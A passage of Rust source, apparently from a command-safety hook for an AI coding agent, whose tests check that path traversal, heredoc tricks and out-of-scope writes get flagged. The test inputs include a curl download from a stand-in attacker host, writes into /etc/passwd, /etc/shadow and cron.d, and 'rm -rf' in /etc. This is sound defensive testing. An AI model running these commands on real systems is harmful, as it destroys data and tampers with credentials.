/// Require every normalized candidate to be allowed or unmatched before
/// widening a confined-write command; explicit Ask/Deny still wins (#168).
pub(super) fn every_segment_is_allow_or_unmatched_default(
    policy: &SafetyPolicy,
    command: &str,
    fallback: Verdict,
    scratchpad_roots: &[String],
) -> bool {
    let candidates = normalize_segments(command);
    if candidates.is_empty() {
        return false;
    }
    candidates.iter().all(|candidate| {
        let outcome =
            evaluate_candidate_outcome(policy, candidate, command, fallback, scratchpad_roots);
        outcome.verdict == Verdict::Allow
            || (outcome.verdict == fallback && outcome.matched.is_none())
    })
}

#[cfg(test)]
mod tests {
    use super::super::tests::*;
    use super::*;

    // -- strip_known_root_cd_prefix (issue #168, decision e) --------------

    #[test]
    fn cd_prefix_strips_a_known_worktree_or_scratchpad_root() {
        let roots = vec!["/repo".to_string(), "/tmp/claude".to_string()];
        assert_eq!(
            strip_known_root_cd_prefix("cd /repo && git log", &roots).as_deref(),
            Some("git log")
        );
        assert_eq!(
            strip_known_root_cd_prefix("cd /repo/sub && git log", &roots).as_deref(),
            Some("git log")
        );
        assert_eq!(
            strip_known_root_cd_prefix("cd /tmp/claude/out; ls", &roots).as_deref(),
            Some("ls")
        );
        assert_eq!(
            strip_known_root_cd_prefix("cd /anywhere/.claude/worktrees/feat && cargo fmt", &roots)
                .as_deref(),
            Some("cargo fmt")
        );
    }

    #[test]
    fn cd_prefix_leaves_unknown_or_dynamic_paths_untouched() {
        let roots = vec!["/repo".to_string()];
        for command in [
            "cd /etc && rm -rf .",
            "cd $HOME/evil && rm -rf .",
            "cd `pwd`/x && rm -rf .",
            "cd ~ && rm -rf .",
            "cd /repo",
            "cd /repo/../../etc && cat shadow",
        ] {
            assert!(
                strip_known_root_cd_prefix(command, &roots).is_none(),
                "{command} must not be stripped"
            );
        }
    }

    #[test]
    fn a_cd_into_the_process_working_directory_then_git_log_allows_headlessly() {
        let repo = tempfile::tempdir().expect("tempdir");
        let home = tempfile::tempdir().expect("tempdir");
        let _home = super::super::testenv::HomeGuard::set(home.path());
        let empty: HashMap<String, String> = HashMap::new();
        let cfg = CtxConfig::load(repo.path(), &|k| empty.get(k).cloned()).expect("loads");

        let cwd = std::env::current_dir()
            .expect("cwd")
            .to_string_lossy()
            .replace('\\', "/");
        let command = format!("cd {cwd} && git log");
        let stdin = format!(
            r#"{{"tool_name":"Bash","tool_input":{{"command":"{command}"}},"permission_mode":"dontAsk"}}"#
        );
        let mut out = Vec::new();
        run_check_hook_mode(&cfg, &mut out, &stdin).expect("runs");
        let text = String::from_utf8(out).expect("utf8");
        assert!(
            !text.contains(r#""permissionDecision":"ask""#) && !text.contains("deny"),
            "cd into the process cwd then a plain git log must classify by git log alone: got {text}"
        );
    }

    #[test]
    fn a_cd_into_an_unknown_root_then_a_destructive_command_still_escalates() {
        let repo = tempfile::tempdir().expect("tempdir");
        let home = tempfile::tempdir().expect("tempdir");
        let _home = super::super::testenv::HomeGuard::set(home.path());
        let empty: HashMap<String, String> = HashMap::new();
        let cfg = CtxConfig::load(repo.path(), &|k| empty.get(k).cloned()).expect("loads");

        // "default" (interactive-ish) rather than "dontAsk": an `Ask`
        // verdict under `dontAsk` is deliberately silent (no output at all
        // -- pre-existing, unrelated to this task, see `hook_output`'s own
        // doc comment on `Verdict::Ask if dont_ask => return None`), so
        // "default" is what lets this test observe the escalation as
        // explicit text rather than mere silence that could mean anything.
        let stdin = r#"{"tool_name":"Bash","tool_input":{"command":"cd /etc && rm -rf ."},"permission_mode":"default"}"#;
        let mut out = Vec::new();
        run_check_hook_mode(&cfg, &mut out, stdin).expect("runs");
        let text = String::from_utf8(out).expect("utf8");
        assert!(
            text.contains(r#""permissionDecision":"ask""#),
            "an unknown-root cd ahead of rm -rf must still ask: got {text}"
        );
    }

    // -- target_is_confined (code review fix, CRITICAL) --------------------

    /// `target_is_confined` used to gate confinement on a plain `starts_
    /// with`, so a SIBLING directory whose name merely shares the root's
    /// text as a prefix (`/tmp/claude-evil`) was wrongly treated as beneath
    /// `/tmp/claude`. Must require the exact root, or the root followed by a
    /// path separator -- the same boundary guard `strip_known_root_cd_
    /// prefix` already applies to its own root comparison.
    #[test]
    fn target_is_confined_rejects_a_sibling_prefix_path() {
        let roots = vec!["/tmp/claude".to_string()];
        assert!(
            !target_is_confined("/tmp/claude-evil/x", &roots),
            "a sibling directory must never be treated as confined"
        );
        assert!(
            !target_is_confined("/tmp/claude-evil", &roots),
            "a sibling directory (no trailing component) must never be treated as confined"
        );
        // The exact root, and a genuine child, still qualify.
        assert!(target_is_confined("/tmp/claude", &roots));
        assert!(target_is_confined("/tmp/claude/out.log", &roots));
    }

    /// A backslash-spelled target beneath a sibling directory must be
    /// rejected the same way, after the function's own `\`-to-`/`
    /// normalization -- the boundary guard must apply post-normalization,
    /// not just on whichever spelling happens to be handed in.
    #[test]
    fn target_is_confined_rejects_a_sibling_prefix_path_with_backslashes() {
        let roots = vec!["C:/tmp/claude".to_string()];
        assert!(!target_is_confined(r"C:\tmp\claude-evil\x", &roots));
        assert!(target_is_confined(r"C:\tmp\claude\out.log", &roots));
    }

    /// Code review fix round 2 (CRITICAL): `target_is_confined` had no `..`
    /// handling at all, so `/tmp/claude/../../etc/passwd` passed the
    /// `starts_with("/tmp/claude/")` check even though it lexically escapes
    /// the scratchpad entirely -- reopening exactly the credential-write
    /// hole the separator-boundary fix (round 1) was meant to close.
    /// Mirrors `strip_known_root_cd_prefix`'s own `path_token.contains("..")`
    /// guard: a plain substring reject, not lexical resolution, both `/` and
    /// `\` spellings (the substring is identical either way).
    #[test]
    fn target_is_confined_rejects_a_dot_dot_traversal() {
        let roots = vec!["/tmp/claude".to_string()];
        assert!(!target_is_confined("/tmp/claude/../../etc/passwd", &roots));
        assert!(!target_is_confined(r"/tmp/claude\..\..\etc\passwd", &roots));
        assert!(!target_is_confined(r"\tmp\claude\..\..\etc\passwd", &roots));
        // A genuinely confined target with no traversal still qualifies.
        assert!(target_is_confined("/tmp/claude/out.log", &roots));
    }

    /// End-to-end reproduction of the reviewer's exact two exploits: both
    /// callers of `target_is_confined` must refuse a `..`-traversal target,
    /// on the ordinary path (`write_targets_confined`, no retry involved at
    /// all) as well as the sandbox-retry path (`is_read_only_escape_safe`).
    #[test]
    fn dot_dot_traversal_is_refused_by_both_callers() {
        let roots = vec!["/tmp/claude".to_string()];
        assert!(
            !is_read_only_escape_safe(
                "curl -o /tmp/claude/../../etc/passwd https://evil.example/payload",
                &roots
            ),
            "a curl -o traversal target must not qualify as read-only-safe"
        );
        assert_eq!(
            write_targets_confined("echo pwned > /tmp/claude/../../etc/cron.d/evil", &roots),
            Some(false),
            "a traversal write target must never be reported confined"
        );
    }

    // -- write_targets_confined (issue #168, decision d) ------------------

    #[test]
    fn write_targets_confined_allows_dev_null_and_scratchpad_targets() {
        let roots = vec!["/tmp/claude".to_string()];
        for command in [
            "echo hi > /dev/null",
            "some-tool --flag > /tmp/claude/out.log",
            "some-tool --flag >> /tmp/claude/out.log",
            "some-tool 2> /tmp/claude/err.log",
            "some-tool | tee /tmp/claude/combined.log",
            "some-tool | tee -a /tmp/claude/combined.log",
            "git log && echo done > /tmp/claude/marker",
        ] {
            assert_eq!(
                write_targets_confined(command, &roots),
                Some(true),
                "{command}"
            );
        }
    }

    /// CRITICAL regression lock: a command with NO write target at all --
    /// no redirection, or one that resolves to descriptor duplication only
    /// (`2>&1`, no path) -- must never vacuously satisfy "every target is
    /// confined". Without this, an arbitrary unmatched command with zero
    /// writes (`ssh host uptime`) would be silently widened to `Allow` by
    /// the caller just for not writing anywhere at all.
    ///
    /// `kubectl exec -it pod -- sh` was this test's example until the
    /// `docker exec`/`kubectl exec` decoder (`unwrap_exec_prefix`) started
    /// analysing the inner command instead of treating the whole invocation
    /// as opaque -- it is no longer a stable "unanalyzable" example (its
    /// analyzability is exactly what changed), so `ssh host uptime` (a
    /// different program this module still never looks inside) takes its
    /// place. `write_targets_confined` itself is unaffected either way: it
    /// scans `split_segments` directly and has no exec-decoding of its own,
    /// so its answer for the old example did not actually change -- this
    /// swap is about keeping the test's chosen example honest, not about a
    /// behavior change here.
    #[test]
    fn write_targets_confined_has_no_opinion_when_there_is_no_write_target_at_all() {
        let roots = vec!["/tmp/claude".to_string()];
        for command in ["ssh host uptime", "some-tool 2>&1", "git log"] {
            assert_eq!(write_targets_confined(command, &roots), None, "{command}");
        }
    }

    #[test]
    fn write_targets_confined_rejects_targets_outside_the_scratchpad() {
        let roots = vec!["/tmp/claude".to_string()];
        for command in [
            "echo hi > /etc/passwd",
            "some-tool >> ~/.bashrc",
            "some-tool | tee /etc/shadow",
        ] {
            assert_eq!(
                write_targets_confined(command, &roots),
                Some(false),
                "{command}"
            );
        }
    }

    #[test]
    fn write_targets_confined_has_no_opinion_on_unparseable_targets() {
        let roots = vec!["/tmp/claude".to_string()];
        for command in ["some-tool > $OUT", "some-tool > \"$(mktemp)\""] {
            assert_eq!(write_targets_confined(command, &roots), None, "{command}");
        }
    }

    #[test]
    fn write_targets_confined_returns_none_with_no_scratchpad_roots_configured() {
        assert_eq!(write_targets_confined("echo hi > /dev/null", &[]), None);
    }

    #[test]
    fn orchestrator_repo_write_target_catches_repository_writes() {
        let cwd = "/work/repo";
        for command in [
            "sed -i 's/a/b/' src/main.rs",
            "sed -i.bak -e 's/a/b/' src/main.rs",
            "perl -pi -e 's/a/b/' Cargo.toml",
            "echo x > src/lib.rs",
            "echo x >> /work/repo/README.md",
            "cat > README.md <<'EOF'\nhi\nEOF",
            "some | tee src/x.rs",
            "cp /tmp/claude-501/x src/y.rs",
            "mv a.txt docs/b.txt",
            "python3 -c \"open('src/x.py','w').write('a')\"",
            "node -e \"require('fs').writeFileSync('src/x.js','a')\"",
            // Issue #334 review fix: `git apply`/`git am`/`patch` are
            // never exempt on program name alone -- they apply an
            // arbitrary diff, which can write anywhere.
            "git apply p.diff",
            "git apply - <<'EOF'\nx\nEOF",
            "git am 0001.patch",
            "patch -p1 < .zirv/work/p.diff",
        ] {
            assert!(
                orchestrator_repo_write_target(command, cwd, &fake_repo_root_of, &|_| None)
                    .is_some(),
                "{command}"
            );
        }
    }

    #[test]
    fn orchestrator_repo_write_target_only_reports_path_output_redirections() {
        let cwd = "/work/repo";
        for (command, target) in [
            ("echo x > src/x.rs", "src/x.rs"),
            ("cat > README.md", "README.md"),
            ("cmd 2> src/err.log", "src/err.log"),
            ("cmd &> out.txt", "out.txt"),
            ("cmd >& legacy.txt", "legacy.txt"),
            ("cmd >&src/legacy.log", "src/legacy.log"),
            ("cmd >> src/out.log", "src/out.log"),
            ("cmd >| src/out.log", "src/out.log"),
        ] {
            assert_eq!(
                orchestrator_repo_write_target(command, cwd, &fake_repo_root_of, &|_| None),
                Some(target.to_string()),
                "{command}"
            );
        }
    }

    #[test]
    fn orchestrator_repo_write_target_ignores_input_and_descriptor_redirections() {
        let cwd = "/work/repo";
        for command in [
            "zirv agent codex --workdir /x/wt338 - < /private/tmp/claude-501/session/scratchpad/brief-338.md",
            "cat < README.md",
            "cmd 2>&1 | grep x",
            "cmd >&2",
            "cmd >& 2",
            "cmd 2>& 1",
            "cmd 2>& -",
            "cat <<'EOF'\nhello\nEOF",
            "diff <(a) <(b)",
            "for i in $(seq 1 80); do s=$(zirv ctx status --brief 2>&1); if echo \"$s\" | grep -qE 'x'; then echo READY; exit 0; fi; sleep 30; done",
        ] {
            assert_eq!(
                orchestrator_repo_write_target(command, cwd, &fake_repo_root_of, &|_| None),
                None,
                "{command}"
            );
        }
    }

    /// Issue #887: a heredoc delimiter inside or outside `$(...)` is never a
    /// file write, while a real redirect next to a heredoc still is.
    #[test]
    fn orchestrator_repo_write_target_ignores_heredocs_inside_command_substitutions() {
        let cwd = "/work/repo";
        for command in [
            "gh pr create --title t --body \"$(cat <<'EOF'\n## Summary\n- one line\n\nmore text > not a redirect\nEOF\n)\"",
            "gh pr create --body \"$(cat <<EOF\nbody\nEOF\n)\"",
            "gh pr create --body \"$(cat <<\"EOF\"\nbody\nEOF\n)\"",
            "gh pr create --body \"$(cat <<-EOF\n\tbody\n\tEOF\n)\"",
            "git commit -m \"$(cat <<'EOF'\nmsg\nEOF\n)\"",
        ] {
            assert_eq!(
                orchestrator_repo_write_target(command, cwd, &fake_repo_root_of, &|_| None),
                None,
                "{command}"
            );
        }
        for command in [
            "cat > notes.md <<'EOF'\nhi\nEOF",
            "cat <<'EOF' > notes.md\nhi\nEOF",
            "echo \"$(cat <<'EOF' > notes.md\nhi\nEOF\n)\"",
        ] {
            assert_eq!(
                orchestrator_repo_write_target(command, cwd, &fake_repo_root_of, &|_| None),
                Some("notes.md".to_string()),
                "{command}"
            );
        }
    }

    /// Issue #910 part 1: prose in an unquoted or double-quoted heredoc body
    /// is data, never a redirect; the same body with a real redirect on the
    /// opener line still denies.
    #[test]
    fn orchestrator_repo_write_target_ignores_prose_in_expanding_heredoc_bodies() {
        let cwd = "/work/repo";
        for command in [
            "cat <<EOF\nthe value > does not matter\nEOF",
            "cat <<\"EOF\"\nsee a -> b and x > does\nEOF",
            "cat <<-EOF\n\tcd && echo > does\n\tEOF",
            "cat <<EOF | grep x\nfoo > bar baz\nEOF",
        ] {
            assert_eq!(
                orchestrator_repo_write_target(command, cwd, &fake_repo_root_of, &|_| None),
                None,
                "{command}"
            );
        }
        for command in [
            "cat > src/x.rs <<EOF\nhi > there\nEOF",
            "cat <<EOF > src/x.rs\nhi > there\nEOF",
            "cat <<EOF\n$(echo x > src/x.rs)\nEOF",
        ] {
            assert!(
                orchestrator_repo_write_target(command, cwd, &fake_repo_root_of, &|_| None)
                    .is_some(),
                "{command}"
            );
        }
    }

    /// A heredoc body fed to a shell or interpreter is a script: its writes
    /// are real whatever the quoting; prose heredocs for other commands stay
    /// inert.
    #[test]
    fn orchestrator_repo_write_target_scans_interpreter_heredoc_bodies() {
        let cwd = "/work/repo";
        for command in [
            "bash <<EOF\necho pwned > src/main.rs\nEOF",
            "bash <<'EOF'\necho pwned > src/main.rs\nEOF",
            "sh -s <<EOF\necho pwned > src/main.rs\nEOF",
            "cat <<EOF | sh\necho pwned > src/main.rs\nEOF",
            "cat <<EOF | bash\necho pwned > src/main.rs\nEOF",
            "zsh <<EOF\necho pwned > src/main.rs\nEOF",
            "python3 <<EOF\nopen('src/main.rs','w').write('x')\nEOF",
            "bash <<EOF 2>&1\necho pwned > src/main.rs\nEOF",
            "bash <<EOF | tee log\necho pwned > src/main.rs\nEOF",
            "sh <<EOF && echo done\necho pwned > src/main.rs\nEOF",
            "bash <<EOF; true\necho pwned > src/main.rs\nEOF",
            "python3 <<EOF || exit 1\nopen('src/main.rs','w').write('x')\nEOF",
            "command bash <<EOF\necho pwned > src/main.rs\nEOF",
            "nohup bash <<EOF\necho pwned > src/main.rs\nEOF",
            "time bash <<EOF\necho pwned > src/main.rs\nEOF",
            "timeout 5 bash <<EOF\necho pwned > src/main.rs\nEOF",
            "nice sh <<EOF\necho pwned > src/main.rs\nEOF",
            "stdbuf -oL sh <<EOF\necho pwned > src/main.rs\nEOF",
            "busybox sh <<EOF\necho pwned > src/main.rs\nEOF",
            "if x; then bash <<EOF\necho pwned > src/main.rs\nEOF",
            "{ bash <<EOF\necho pwned > src/main.rs\nEOF",
            "! bash <<EOF\necho pwned > src/main.rs\nEOF",
            "do bash <<EOF\necho pwned > src/main.rs\nEOF",
            "else sh <<EOF\necho pwned > src/main.rs\nEOF",
            ". <<EOF\necho pwned > src/main.rs\nEOF",
        ] {
            assert!(
                orchestrator_repo_write_target(command, cwd, &fake_repo_root_of, &|_| None)
                    .is_some(),
                "{command}"
            );
        }
        assert_eq!(
            orchestrator_repo_write_target(
                "cat > $TMPDIR/x.md <<EOF\nthe value > does not matter\nEOF",
                cwd,
                &fake_repo_root_of,
                &|_| None
            ),
            None
        );
    }

    /// Issue #910 part 2: `sed -i` is classified by its file operands, so a
    /// scratchpad file outside any repository is not a repository write
    /// whatever the expression looks like; real repository targets still deny.
    #[test]
    fn orchestrator_repo_write_target_classifies_sed_in_place_by_file_operand() {
        let cwd = "/work/repo";
        let expr = "'s/best=\\[m for m in msgs if x\\]/best=[]/'";
        let outside = "/private/tmp/claude-501/s/scratchpad/f.py";
        for command in [
            format!("sed -i {expr} {outside}"),
            format!("sed -i '' {expr} {outside}"),
            format!("sed -i.bak {expr} {outside}"),
            format!("sed --in-place {expr} {outside}"),
            format!("sed --in-place=.bak {expr} {outside}"),
            format!("sed -i -e {expr} {outside}"),
            format!("sed -i -e {expr} -e 's/a/b/' {outside}"),
            format!("sed -i -E {expr} {outside}"),
        ] {
            assert_eq!(
                orchestrator_repo_write_target(&command, cwd, &fake_repo_root_of, &|_| None),
                None,
                "{command}"
            );
        }
        for command in [
            format!("sed -i '' {expr} src/main.rs"),
            format!("sed --in-place {expr} src/main.rs"),
            format!("sed -i -e {expr} src/main.rs"),
            format!("sed -i -E {expr} /work/repo/src/main.rs"),
        ] {
            assert_eq!(
                orchestrator_repo_write_target(&command, cwd, &fake_repo_root_of, &|_| None),
                Some(
                    if command.ends_with("/work/repo/src/main.rs") {
                        "/work/repo/src/main.rs"
                    } else {
                        "src/main.rs"
                    }
                    .to_string()
                ),
                "{command}"
            );
        }
    }

    /// Issue #889: `->where(` inside a quoted argument is never a redirect,
    /// and a `kubectl exec ... --` with no local redirect writes nothing.
    #[test]
    fn orchestrator_repo_write_target_ignores_redirect_lookalikes_in_quoted_arguments() {
        let cwd = "/work/repo";
        for command in [
            "kubectl --context minikube exec deploy/webserver -- php artisan tinker --execute=\"echo App\\Journey::query()->where('journey_id',1)->count();\" | grep x | tail -5",
            "kubectl exec deploy/web -- php artisan tinker --execute='$q->where(1)->get();'",
            "kubectl exec deploy/web -- sh -c \"echo a > /tmp/inside-pod\"",
            "echo \"a -> b\" | grep x",
            "kubectl --context minikube exec deploy/webserver -- php artisan tinker --execute=\"\\$j = App\\\\Models\\\\Journey::query()->where('journey_id',1)->first(); echo \\$j->id;\" 2>&1 | grep x | tail -5",
            "kubectl exec deploy/web -- php artisan tinker --execute=\"echo 1;\n\\$q->where('a',1)->get();\"",
            "kubectl exec deploy/web -- php artisan tinker --execute=\"\\\"x\\\"->where(1)\"",
            "kubectl exec deploy/web -- php artisan tinker --execute \"A::where('a','>',1)->count()\"",
            "kubectl exec deploy/web -- php artisan tinker --execute=\"$(echo A)::query()->where('a',1)->count()\" | head",
            "kubectl exec deploy/web -- php artisan tinker --execute=\"A::query()->where('it\\'s',1)->count()\" | head",
            "kubectl exec deploy/web -- php artisan tinker --execute=A::query\\(\\)-\\>where\\(1\\)",
            "kubectl exec deploy/web -- php artisan tinker --execute=\"A::q()->where('a',1)\"'->get()'",
        ] {
            assert_eq!(
                orchestrator_repo_write_target(command, cwd, &fake_repo_root_of, &|_| None),
                None,
                "{command}"
            );
        }
        assert_eq!(
            orchestrator_repo_write_target(
                "kubectl exec deploy/web -- ls && echo \"a->b\" > src/x.rs",
                cwd,
                &fake_repo_root_of,
                &|_| None
            ),
            Some("src/x.rs".to_string())
        );
    }

    /// Issue #883: relative targets resolve against the effective directory
    /// after a literal `cd` in the same chain; subshell/substitution `cd`
    /// does not leak.
    #[test]
    fn orchestrator_repo_write_target_resolves_relative_targets_after_cd() {
        let cwd = "/work/repo";
        for command in [
            "cd /tmp/x && mkdir -p y",
            "cd /tmp/x && a && mkdir -p y",
            "cd /tmp/x && cd .. && mkdir -p y",
            "cd /work/repo/sub && cd /tmp/x && mkdir -p y",
        ] {
            assert_eq!(
                orchestrator_repo_write_target(command, cwd, &fake_repo_root_of, &|_| None),
                None,
                "{command}"
            );
        }
        for (command, target) in [
            ("cd /work/repo/sub && mkdir -p y", "y"),
            ("cd sub && mkdir -p y", "y"),
            ("cd /tmp/x && cd /work/repo && mkdir -p y", "y"),
            ("(cd /tmp/x) && mkdir -p y", "y"),
            ("echo $(cd /tmp/x) && mkdir -p y", "y"),
            ("cd $VAR && mkdir -p y", "y"),
        ] {
            assert_eq!(
                orchestrator_repo_write_target(command, cwd, &fake_repo_root_of, &|_| None),
                Some(target.to_string()),
                "{command}"
            );
        }
    }

    /// A `cd` only carries to segments chained by `&&`; any other separator
    /// may run the next segment without the `cd` having taken effect.
    #[test]
    fn orchestrator_repo_write_target_cd_only_carries_across_and_chains() {
        let cwd = "/work/repo";
        for command in [
            "cd /tmp/x; mkdir y",
            "cd /tmp/x || mkdir y",
            "cd /tmp/x & mkdir y",
            "cd /tmp/x && true; mkdir y",
            "cd /tmp/x; echo a > y/out.txt",
        ] {
            assert!(
                orchestrator_repo_write_target(command, cwd, &fake_repo_root_of, &|_| None)
                    .is_some(),
                "{command}"
            );
        }
    }

    /// Groups, `||`-skipped cds and other dir-changing builtins must not leave
    /// a stale tracked cwd; a `cd` after `;` or a continued `&&` still counts.
    #[test]
    fn orchestrator_repo_write_target_cd_bypasses_reset_the_tracked_cwd() {
        let cwd = "/work/repo";
        for command in [
            "cd /tmp && (cd /work/repo && mkdir y)",
            "cd /tmp && { cd /work/repo && mkdir y; }",
            "true || cd /tmp && mkdir y",
            "cd /tmp && pushd /work/repo && mkdir y",
            "cd /tmp && popd && mkdir y",
            "cd /tmp && builtin cd /work/repo && mkdir y",
            "cd /tmp && command cd /work/repo && mkdir y",
        ] {
            assert!(
                orchestrator_repo_write_target(command, cwd, &fake_repo_root_of, &|_| None)
                    .is_some(),
                "{command}"
            );
        }
        for command in ["x; cd /tmp/x && mkdir -p y", "cd /tmp/x &&\nmkdir -p y"] {
            assert_eq!(
                orchestrator_repo_write_target(command, cwd, &fake_repo_root_of, &|_| None),
                None,
                "{command}"
            );
        }
    }

    /// A `cd` the guard cannot resolve literally resets to the session cwd.
    #[test]
    fn orchestrator_repo_write_target_unresolvable_cd_resets_the_tracked_cwd() {
        let cwd = "/work/repo";
        for command in [
            "cd /tmp && cd - && mkdir x",
            "cd /tmp && cd $VAR && mkdir y",
            "cd /tmp && cd && mkdir y",
            "cd /tmp && cd -P x && mkdir y",
            "cd /tmp && cd ~ && mkdir y",
        ] {
            assert!(
                orchestrator_repo_write_target(command, cwd, &fake_repo_root_of, &|_| None)
                    .is_some(),
                "{command}"
            );
        }
    }

    #[test]
    fn orchestrator_repo_write_target_scans_command_substitutions_for_real_writes() {
        let cwd = "/work/repo";
        for (command, target) in [
            ("echo $(cmd > src/substitution.log)", "src/substitution.log"),
            ("echo `cmd > src/backtick.log`", "src/backtick.log"),
        ] {
            assert_eq!(
                orchestrator_repo_write_target(command, cwd, &fake_repo_root_of, &|_| None),
                Some(target.to_string()),
                "{command}"
            );
        }
    }

    #[test]
    fn orchestrator_repo_write_target_has_no_opinion_on_non_repository_writes() {
        let cwd = "/work/repo";
        for command in [
            "echo x > .zirv/work/notes.md",
            "echo x > /work/repo/.zirv/memory/m.md",
            "echo x > /tmp/claude-501/s/out.md",
            "echo x > /dev/null",
            "git commit -m x",
            "git checkout -- src/x.rs",
            "cargo build",
            "cargo fmt -- --check",
            "sed 's/a/b/' src/main.rs",
            "sed -n '1,5p' src/main.rs",
            "cat src/main.rs",
            "echo x > \"$TMPDIR/x\"",
            "echo x > $OUT",
            "mkdir -p .zirv/work/x && gh issue view 1 > .zirv/work/x/i.md",
            "python3 -c \"print(open('src/x.py').read())\"",
            "python3 -c \"open('/work/repo/.zirv/work/o.txt','w').write('a')\"",
            "cp src/a.rs /tmp/claude-501/s/a.rs",
            "echo x > ~/notes.md",
            "echo x > ../outside.txt",
            // Issue #334 review fix: `git apply`/`git am` piped straight
            // from a `git` upstream is how the seat integrates a worker's
            // diff, and stays exempt.
            "git -C /w diff | git apply",
            "git diff main | git apply -",
            "git format-patch --stdout | git am",
        ] {
            assert_eq!(
                orchestrator_repo_write_target(command, cwd, &fake_repo_root_of, &|_| None),
                None,
                "{command}"
            );
        }
    }

    /// #923: a quoted heredoc body is data even when it holds backticks or
    /// `$(`; only an unquoted body with a live substitution stays visible.
    #[test]
    fn orchestrator_repo_write_target_treats_quoted_heredoc_bodies_as_data() {
        let cwd = "/work/repo";
        for command in [
            "cat >> /private/tmp/claude-501/s/scratchpad/record.md <<'EOF'\n## Cost\na >5% cost, `code` and $(x)\nEOF",
            "cat >> $TMPDIR/record.md <<'EOF'\na >5% cost with `ticks`\nEOF",
            "cat > /tmp/claude-501/r.md <<\"EOF\"\nrow >5% and $(not run)\nEOF",
            "glab mr update 349 --description \"$(cat <<'EOF'\nFields show <style> style when the value comes from the style `x` $(y)\nEOF\n)\"",
            "cat <<-'EOF'\n\tcost >5%, `x`\n\tEOF",
        ] {
            assert_eq!(
                orchestrator_repo_write_target(command, cwd, &fake_repo_root_of, &|_| None),
                None,
                "{command}"
            );
        }
        for command in [
            "cat > src/x.rs <<'EOF'\nfn main() {}\nEOF",
            "cat >> src/x.rs <<'EOF'\na >5% `x` $(y)\nEOF",
            "cat <<'EOF' > src/x.rs\na `x`\nEOF",
        ] {
            assert!(
                orchestrator_repo_write_target(command, cwd, &fake_repo_root_of, &|_| None)
                    .is_some(),
                "{command}"
            );
        }
    }

    /// #923: a heredoc fed to an interpreter is scanned as that language's
    /// code, not as shell, so a comparison operator is not a redirect while
    /// a real write primitive still is.
    #[test]
    fn orchestrator_repo_write_target_scans_interpreter_heredocs_as_code_not_shell() {
        let cwd = "/work/repo";
        for command in [
            "python3 -I - \"$R\" <<'EOF'\nimport sys\nif x and i>5:\n    print(i)\nEOF",
            "python3 - <<'EOF'\nprint(open('src/x.py').read())\nEOF",
            "node - <<'EOF'\nif (a>5) console.log(a)\nEOF",
        ] {
            assert_eq!(
                orchestrator_repo_write_target(command, cwd, &fake_repo_root_of, &|_| None),
                None,
                "{command}"
            );
        }
        for command in [
            "python3 - <<'EOF'\nopen('src/x.py','w').write('a')\nEOF",
            "python3 - <<'EOF'\nfrom pathlib import Path\nPath('src/x.py').write_text('a')\nEOF",
            "node - <<'EOF'\nrequire('fs').writeFileSync('src/x.js','a')\nEOF",
            "bash <<'EOF'\nif [ 1 ]; then echo x > src/x.rs; fi\nEOF",
        ] {
            assert!(
                orchestrator_repo_write_target(command, cwd, &fake_repo_root_of, &|_| None)
                    .is_some(),
                "{command}"
            );
        }
    }

    /// #923/#924 follow-up: descriptor duplication, null sinks, quoted sed
    /// expressions, prose and heredoc shapes seen in the wild are not writes.
    #[test]
    fn orchestrator_repo_write_target_ignores_recorded_false_targets() {
        let cwd = "/work/repo";
        for command in [
            "cargo build 2>&1 | tail -3",
            "cargo build 2>/dev/null",
            "cargo build >/dev/null 2>&1",
            "cargo build &>/dev/null",
            "cargo build >&2",
            "cat <<EOF\nEOF",
            "git commit -m \"fix x > where y does z\"",
            "echo 'if a > where then does' | grep x",
            "sed -n 's/-ge 90 \\]\\]/-ge 95 ]]/p' src/x.sh",
            "sed -i 's/-ge 90 \\]\\]/-ge 95 ]]/' /private/tmp/claude-501/s/scratchpad/x.sh",
            "sed -i 's#^B = .*#B = 2#' /private/tmp/claude-501/s/scratchpad/x.toml",
            "git push -q -u origin feat/x <<EOF\nnote > where\nEOF",
            "git push -q -u origin feat/x 2>&1 <<'EOF'\nnote > does\nEOF",
        ] {
            assert_eq!(
                orchestrator_repo_write_target(command, cwd, &fake_repo_root_of, &|_| None),
                None,
                "{command}"
            );
        }
        for command in [
            "echo x > README.md",
            "echo x >README.md 2>&1",
            "sed -i 's/a/b/' src/file.rs",
            "cargo build 2>&1 > src/out.log",
        ] {
            assert!(
                orchestrator_repo_write_target(command, cwd, &fake_repo_root_of, &|_| None)
                    .is_some(),
                "{command}"
            );
        }
    }

    /// #923: a write whose target resolves outside the repository (the
    /// session scratchpad, `$TMPDIR`, `/tmp/claude-<uid>`) is not a
    /// repository write, relative or absolute.
    #[test]
    fn orchestrator_repo_write_target_ignores_out_of_repo_targets() {
        let cwd = "/work/repo";
        for command in [
            "echo x > /private/tmp/claude-501/s/scratchpad/a.md",
            "echo x >> /tmp/claude-501/a.md",
            "echo x > ../elsewhere/a.md",
            "cd /private/tmp/claude-501/s/scratchpad && echo x > a.md",
            "tee /tmp/claude-501/a.md < /dev/null",
        ] {
            assert_eq!(
                orchestrator_repo_write_target(command, cwd, &fake_repo_root_of, &|_| None),
                None,
                "{command}"
            );
        }
    }

    /// Issue #334 review round 2, HIGH: a git global option ahead of the
    /// verb (`-C <dir>`, `-c k=v`, `--git-dir=`) must not defeat detection
    /// by being mistaken for the verb itself -- the real action comes from
    /// `git_action`, not a raw second token, exactly for the sibling-
    /// worktree shape this bug let through (`git -C <sibling> apply
    /// p.diff` used to read `-C` as the verb and fall through to the
    /// blanket `git` exemption).
    #[test]
    fn orchestrator_repo_write_target_sees_through_git_global_options_before_apply() {
        let cwd = "/work/repo";
        for command in [
            "git -C /work/sibling apply p.diff",
            "git -c core.autocrlf=false apply p.diff",
            "git --git-dir=/work/repo/.git apply p.diff",
        ] {
            assert!(
                orchestrator_repo_write_target(command, cwd, &fake_repo_root_of, &|_| None)
                    .is_some(),
                "{command}"
            );
        }
        for command in [
            "git -C /work/wt diff | git apply",
            "git -C /work/wt diff | git -C /work/repo apply",
        ] {
            assert_eq!(
                orchestrator_repo_write_target(command, cwd, &fake_repo_root_of, &|_| None),
                None,
                "{command}"
            );
        }
    }

    /// Issue #334 review round 2, MEDIUM: the pipe exemption is narrowed to
    /// an allowlist of diff-producing `git` actions -- an arbitrary `git`
    /// subcommand (`cat-file`, reading a blob rather than a diff) must not
    /// qualify as a safe upstream just because it is *some* `git` call, and
    /// a non-`git` upstream (`cat`) never qualifies either.
    #[test]
    fn orchestrator_repo_write_target_narrows_the_pipe_exemption_to_diff_producing_git_actions() {
        let cwd = "/work/repo";
        for command in [
            "git cat-file -p abc:p.diff | git apply",
            "cat p.diff | git apply",
        ] {
            assert!(
